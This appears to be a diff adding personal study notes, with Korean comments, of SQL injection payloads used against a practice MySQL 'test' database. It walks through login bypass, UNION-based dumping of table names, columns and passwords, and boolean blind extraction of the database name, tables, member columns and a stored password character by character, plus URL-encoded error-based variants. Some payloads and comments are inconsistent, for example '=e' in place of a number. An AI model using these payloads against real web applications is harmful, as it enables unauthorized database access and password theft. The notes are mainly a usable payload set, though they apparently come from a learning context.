@@ -1,0 +1,357 @@
+
+# Error Based
+#로그인 우회
+select * from member where id=''or 1=1 # and pw='';
+select * from member;
+
+
+select * from member where id='test' and 1=1 #' and pw='';
+test' and 1=1 # 
+
+# Union Based
+#검색창 우회
+select * from borad where title like '%%' or 1=1 
+
+#test database의 모든 테이블 출력
+%' or 1=1 Union select null,table_name,null FROM information_schema.tables where table_schema='test'#
+
+# member 테이블의 모든 컬럼 출력
+%' or 1=1 Union select null,column_name,null FROM information_schema.columns where table_name='member'#
+
+# pw 컬럼의 모든 데이터 출력
+%' or 1=1 Union select null,pw,null FROM test.member#
+
+
+
+#Blind
+# schema(데이터베이스) 중 기본 데이터베이스를 제외한 데이터베이스만 뽑아오는 쿼리
+select distinct table_schema from information_schema.tables where table_schema not in('information_schema','mysql','phpmyadmin','performance_schema');
+
+# 기본 데이터베이스를 제외한 데이터베이스가 두번째 이름이 아스키코드로 111 이하 인지 검사하는 쿼리 
+test' and ASCII(SUBSTR(
+(select distinct table_schema from information_schema.tables 
+where table_schema not in('information_schema','mysql','phpmyadmin','performance_schema')),1,1))=116#
+
+
+SELECT 컬럼 FROM 테이블 WHERE id=31 and 1=1;
+
+# 데이터베이스 탈취
+# 현제 데이터베이스 길이가 4인지 검사
+test' and LENGTH(database())=4 #
+
+# 현재 데이터베이스의 첫 글자의 ASCII 코드가 111인지 검사
+test' and ASCII(SUBSTR((database()),1,1))>111 #
+
+# 현재 데이터베이스의 첫 글자의 ASCII 코드가 116인지 검사
+test' and ASCII(SUBSTR((database()),1,1))=116 #
+
+# 현재 데이터베이스의 두번째 글자의 ASCII 코드가 101인지 검사
+test' and ASCII(SUBSTR((database()),2,1))=101 #
+
+# 현재 데이터베이스의 세번째 글자의 ASCII 코드가 115인지 검사
+test' and ASCII(SUBSTR((database()),3,1))=115 #
+
+# 현재 데이터베이스의 네번째 글자의 ASCII 코드가 116인지 검사
+test' and ASCII(SUBSTR((database()),4,1))=116 #
+
+# 테이블 탈취
+# test 데이터베이스의 테이블 개수가 3인지 검사
+test' and (select count(*) from information_schema.tables 
+where table_schema='test') = 3 #
+
+# 두번째 테이블의 길이가 5인지 검사 
+test' and LENGTH(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 0,1))=5 #
+
+
+# 두번째 테이블 첫 글자의 ASCII 코드가 98(b)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 0,1),1,1))=98 #
+
+# 두번째 테이블 두번째 글자의 ASCII 코드가 111(o)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 0,1),2,1))=111 #
+
+# 두번째 테이블 세번째 글자의 ASCII 코드가 97(a)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 0,1),3,1))=97 #
+
+# 두번째 테이블 네번째 글자의 ASCII 코드가 114(r)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 0,1),4,1))=114 #
+
+# 두번째 테이블 마지막 글자의 ASCII 코드가 100(d)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 0,1),5,1))=100 #
+
+
+# 두번째 테이블의 길이가 5인지 검사 
+test' and LENGTH(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 1,1))=5 #
+
+
+# 두번째 테이블 첫 글자의 ASCII 코드가 108(l)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 1,1),1,1))=108 #
+
+# 두번째 테이블 두번째 글자의 ASCII 코드가 111(o)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 1,1),2,1))=111 #
+
+# 두번째 테이블 세번째 글자의 ASCII 코드가 103(g)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 1,1),3,1))=103 #
+
+# 두번째 테이블 네번째 글자의 ASCII 코드가 105(i)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 1,1),4,1))=105 #
+
+# 두번째 테이블 마지막 글자의 ASCII 코드가 110(n)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 1,1),5,1))=110 #
+
+
+# 세번째 테이블의 길이가 6인지 검사 
+test' and LENGTH(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 2,1))=6 #
+
+
+# 세번째 테이블 첫 글자의 ASCII 코드가 109(m)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 2,1),1,1))=109 #
+
+# 세번째 테이블 두번째 글자의 ASCII 코드가 101(e)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 2,1),2,1))=111 #
+
+# 세번째 테이블 세번째 글자의 ASCII 코드가 109(m)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 2,1),3,1))=109 #
+
+# 세번째 테이블 네번째 글자의 ASCII 코드가 98(b)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 2,1),4,1))=98 #
+
+# 세번째 테이블 다섯번째 글자의 ASCII 코드가 101(e)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 2,1),5,1))=e #
+
+# 세번째 테이블 마지막 글자의 ASCII 코드가 114(r)인지 검사 
+test' and ASCII(SUBSTR(
+(select table_name from information_schema.tables 
+where table_schema='test' limit 2,1),6,1))=114 #
+
+
+
+# member 테이블 컬럼 탈취
+
+# member 테이블의 컬럼 개수가 4인지 검사
+test' and (select count(*) from information_schema.columns 
+where table_name='member') = 4 #
+
+# member 테이블의 두번째 컬럼의 길이가 2인지 검사 
+test' and LENGTH(
+(select column_name from information_schema.columns 
+where table_name='member' limit 0,1))=2 #
+
+# member 테이블의 두번째 컬럼 두번째 글자의 ASCII 코드가 105(i)인지 검사
+test' and ASCII(SUBSTR(
+(select column_name from information_schema.columns 
+where table_name='member' limit 0,1),1,1))=105 #
+
+# member 테이블의 두번째 컬럼의 두번째 글자의 ASCII 코드가 100(d)인지 검사
+test' and ASCII(SUBSTR(
+(select column_name from information_schema.columns 
+where table_name='member' limit 0,1),2,1))=100 #
+
+
+# member 테이블의 두번째 컬럼의 길이가 2인지 검사 
+test' and LENGTH(
+(select column_name from information_schema.columns 
+where table_name='member' limit 1,1))=2 #
+
+# member 테이블의 두번째 컬럼 첫번째 글자의 ASCII 코드가 112(p)인지 검사
+test' and ASCII(SUBSTR(
+(select column_name from information_schema.columns 
+where table_name='member' limit 1,1),1,1))=112 #
+
+# member 테이블의 두번째 컬럼의 두번째 글자의 ASCII 코드가 119(w)인지 검사
+test' and ASCII(SUBSTR(
+(select column_name from information_schema.columns 
+where table_name='member' limit 1,1),2,1))=119 #
+
+
+# pw 컬럼의 첫번째 데이터의 길이가 5인지 검사 
+test' and LENGTH((select pw from test.member limit 0,1))=5 #
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 97(a)인지 검사
+test' and ASCII(SUBSTR(
+(select pw from test.member limit 0,1),1,1))=97 #
+
+# pw 컬럼의 첫번째 데이터 두번째 글자의 ASCII 코드가 100(d)인지 검사
+test' and ASCII(SUBSTR(
+(select pw from test.member limit 0,1),2,1))=100 #
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 109(m)인지 검사
+test' and ASCII(SUBSTR(
+(select pw from test.member limit 0,1),3,1))=109 #
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 105(i)인지 검사
+test' and ASCII(SUBSTR(
+(select pw from test.member limit 0,1),4,1))=105 #
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 110(n)인지 검사
+test' and ASCII(SUBSTR(
+(select pw from test.member limit 0,1),5,1))=110 #
+
+
+
+# 숫자형 SQL 인젝션
+(select+case+when+1%3D1+then+32+else+1/0+end)
+
+# 데이터베이스 탈취
+# 현재 데이터베이스 길이가 4인지 조회
+(select+case+when+LENGTH(database())%3D4+then+32+else+1/0+end)
+
+# 현재 데이터베이스의 첫 글자의 ASCII 코드가 116(t)인지 검사
+(select+case+when+
+ASCII(SUBSTR((database()),1,1))%3D116+then+32+else+1/0+end)
+
+# 현재 데이터베이스의 두번째 글자의 ASCII 코드가 101(e)인지 검사
+(select+case+when+
+ASCII(SUBSTR((database()),2,1))%3D101+then+32+else+1/0+end)
+
+# 현재 데이터베이스의 세번째 글자의 ASCII 코드가 115(s)인지 검사
+(select+case+when+
+ASCII(SUBSTR((database()),3,1))%3D115+then+32+else+1/0+end)
+
+# 현재 데이터베이스의 네번째 글자의 ASCII 코드가 116(t)인지 검사
+(select+case+when+
+ASCII(SUBSTR((database()),4,1))%3D116+then+32+else+1/0+end)
+
+# 테이블 탈취
+# test 데이터베이스의 테이블 개수가 3인지 검사
+(select+case+when+
+(select+count(*)+from+information_schema.tables+
+where+table_schema%3D%27test%27)%3D3+then+32+else+1/0+end)
+
+# 세번째 테이블의 길이가 6인지 검사 
+(select+case+when+
+LENGTH(
+(select+table_name+from+information_schema.tables 
++where+table_schema%3D%27test%27+limit+2,1))%3D6+then+32+else+1/0+end)
+
+# 세번째 테이블 첫 글자의 ASCII 코드가 109(m)인지 검사 
+(select+case+when+ASCII(SUBSTR
+((select+table_name+from+information_schema.tables
++where+table_schema='test'+limit+2,1),1,1))%3D109
++then+32+else+1/0+end)
+
+# 세번째 테이블 두번째 글자의 ASCII 코드가 101(e)인지 검사 
+(select+case+when+ASCII(SUBSTR
+((select+table_name+from+information_schema.tables
++where+table_schema='test'+limit+2,1),2,1))%3D101
++then+32+else+1/0+end)
+
+# 세번째 테이블 세번째 글자의 ASCII 코드가 109(m)인지 검사 
+(select+case+when+ASCII(SUBSTR
+((select+table_name+from+information_schema.tables
++where+table_schema='test'+limit+2,1),3,1))%3D109
++then+32+else+1/0+end)
+
+# 세번째 테이블 네번째 글자의 ASCII 코드가 98(b)인지 검사 
+(select+case+when+ASCII(SUBSTR
+((select+table_name+from+information_schema.tables
++where+table_schema='test'+limit+2,1),4,1))%3D98
++then+32+else+1/0+end)
+
+# 세번째 테이블 다섯번째 글자의 ASCII 코드가 101(e)인지 검사 
+(select+case+when+ASCII(SUBSTR
+((select+table_name+from+information_schema.tables
++where+table_schema='test'+limit+2,1),5,1))%3D101
++then+32+else+1/0+end)
+
+# 세번째 테이블 마지막 글자의 ASCII 코드가 114(r)인지 검사 
+(select+case+when+ASCII(SUBSTR
+((select+table_name+from+information_schema.tables
++where+table_schema='test'+limit+2,1),6,1))%3D114
++then+32+else+1/0+end)
+
+
+# member 테이블 컬럼 탈취
+
+# member 테이블의 컬럼 개수가 4인지 검사
+(select+case+when+
+(select+count(*)+from+information_schema.columns+
+where+table_name='member')%3D4
++then+32+else+1/0+end)
+
+
+# member 테이블의 두번째 컬럼의 길이가 2인지 검사 
+(select+case+when+LENGTH((select+column_name+from
++information_schema.columns+
+where+table_name='member'+limit+1,1))%3D2
++then+32+else+1/0+end)
+
+# member 테이블의 두번째 컬럼 첫번째 글자의 ASCII 코드가 112(p)인지 검사
+(select+case+when+
+ASCII(SUBSTR(
+(select+column_name+from+information_schema.columns 
++where+table_name='member'+limit+1,1),1,1))%3D112
++then+32+else+1/0+end)
+
+# member 테이블의 두번째 컬럼 첫번째 글자의 ASCII 코드가 119(w)인지 검사
+(select+case+when+
+ASCII(SUBSTR(
+(select+column_name+from+information_schema.columns 
++where+table_name='member'+limit+1,1),2,1))%3D119
++then+32+else+1/0+end)
+
+
+# pw 컬럼의 첫번째 데이터의 길이가 5인지 검사 
+(select+case+when+
+LENGTH((select+pw+from+test.member+limit+0,1))%3D5
++then+32+else+1/0+end)
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 97(a)인지 검사
+(select+case+when+
+(ASCII(SUBSTR((select+pw+from+test.member+limit+0%2c1)%2c1%2c1)))%3D97
++then+32+else+1/0+end)
+
+# pw 컬럼의 첫번째 데이터 두번째 글자의 ASCII 코드가 100(d)인지 검사
+(select+case+when+
+(ASCII(SUBSTR((select+pw+from+test.member+limit+0%2c1)%2c2%2c1)))%3D100
++then+32+else+1/0+end)
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 109(m)인지 검사
+(select+case+when+
+(ASCII(SUBSTR((select+pw+from+test.member+limit+0%2c1)%2c3%2c1)))%3D109
++then+32+else+1/0+end)
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 105(i)인지 검사
+(select+case+when+
+(ASCII(SUBSTR((select+pw+from+test.member+limit+0%2c1)%2c4%2c1)))%3D105
++then+32+else+1/0+end)
+
+# pw 컬럼의 첫번째 데이터 첫번째 글자의 ASCII 코드가 110(n)인지 검사
+(select+case+when+
+(ASCII(SUBSTR((select+pw+from+test.member+limit+0%2c1)%2c5%2c1)))%3D110
++then+32+else+1/0+end)
